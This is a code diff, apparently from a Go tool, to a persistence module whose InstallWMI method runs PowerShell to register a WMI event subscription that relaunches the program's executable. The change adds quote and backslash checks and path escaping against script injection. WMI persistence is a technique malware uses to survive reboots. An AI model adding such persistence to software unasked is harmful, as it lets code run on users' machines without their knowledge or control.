@@ -8,6 +8,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"strings"
 )
 
 type PersistenceHandler struct {
@@ -101,6 +102,12 @@ func (p *PersistenceHandler) RemoveService(name string) error {
 }
 
 func (p *PersistenceHandler) InstallWMI(name string) error {
+	if strings.ContainsAny(name, "'\"\\") {
+		return fmt.Errorf("invalid characters in name")
+	}
+	escapedPath := strings.ReplaceAll(p.execPath, "'", "''")
+	escapedPath = strings.ReplaceAll(escapedPath, "\\", "\\\\")
+	
 	script := fmt.Sprintf(`
 		$filterName = '%s_Filter'
 		$consumerName = '%s_Consumer'
@@ -118,7 +125,7 @@ func (p *PersistenceHandler) InstallWMI(name string) error {
 			Filter = $filter
 			Consumer = $consumer
 		}
-	`, name, name, p.execPath)
+	`, name, name, escapedPath)
 
 	cmd := exec.Command("powershell", "-Command", script)
 	return cmd.Run()
